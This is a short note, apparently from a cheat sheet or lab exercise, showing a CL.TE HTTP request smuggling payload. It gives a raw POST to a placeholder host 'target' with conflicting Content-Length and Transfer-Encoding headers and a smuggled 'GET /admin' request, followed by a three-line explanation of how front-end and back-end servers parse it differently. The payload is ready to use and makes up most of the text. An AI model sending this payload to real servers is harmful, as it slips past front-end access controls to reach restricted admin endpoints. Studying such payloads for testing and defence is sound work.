POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1

Explanation (short):

Front-end uses Content-Length → forwards whole body as one request

Back-end uses Transfer-Encoding → ends at 0, treats GET /admin as next request

Result: hidden request is smuggled past the front-end
